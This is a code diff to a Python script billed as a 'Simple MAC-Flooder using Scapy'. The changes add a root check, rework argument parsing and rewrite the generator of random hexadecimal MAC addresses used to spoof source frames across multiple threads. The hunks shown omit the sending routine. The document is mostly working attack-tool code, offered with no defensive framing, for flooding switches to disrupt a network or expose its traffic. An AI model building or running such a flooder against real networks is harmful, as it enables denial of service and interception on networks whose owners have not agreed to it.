@@ -2,12 +2,17 @@
 
 from scapy.all import *
 from time import sleep
+from sys import exit as sysexit
 import random
 import threading
-import argparse
+from argparse import ArgumentParser
+
+# check for root
+if not os.geteuid() == 0:
+    sysexit("\nOnly root can run this script\n")
 
 # init option parser
-parser = argparse.ArgumentParser(description='Simple MAC-Flooder using Scapy')
+parser = ArgumentParser(description='Simple MAC-Flooder using Scapy')
 parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
 args = parser.parse_args()
 
@@ -21,8 +26,12 @@ def send_packet():
 
 # generate random MAC
 def get_random_MAC():
-    genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
-    return genMAC
+    mac = ""
+    for i in range(0, 6):
+        digit = hex(random.randint(17,255))
+        digit = digit[2:]
+        mac = mac + digit + ":"
+    return mac[:-1]
 
 # start threads
 def start_threads():
@@ -34,6 +43,4 @@ def start_threads():
 
 # start here
 if __name__ == "__main__":
-    print("RUN AS ROOT!")
-    sleep(1)
     start_threads()
